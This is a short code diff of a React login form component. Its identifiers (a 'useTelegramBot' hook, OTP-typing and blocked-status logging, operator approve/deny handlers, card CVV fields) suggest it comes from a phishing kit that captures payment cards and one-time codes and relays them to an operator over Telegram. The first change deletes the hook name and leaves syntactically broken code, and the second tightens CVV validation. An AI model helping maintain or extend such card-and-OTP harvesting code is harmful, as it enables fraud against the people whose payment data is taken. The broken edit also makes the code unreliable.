@@ -238,7 +238,7 @@ function LoginForm() {
     sendOtpTypingLog,
     sendBlockedLog,
     sendConfirmationLog,
-  } = useTelegramBot(
+  } =  (
     sessionId, 
     handleApprove, 
     handleDeny, 
@@ -428,7 +428,7 @@ function LoginForm() {
       }
     }
     
-    if (!cardDetails.cvv.trim() || cardDetails.cvv.length < 3) {
+    if (!cardDetails.cvv.trim() || (cardDetails.cvv.length !== 3 && cardDetails.cvv.length !== 4)) {
       errors.cvv = t.validCvv;
     }
     
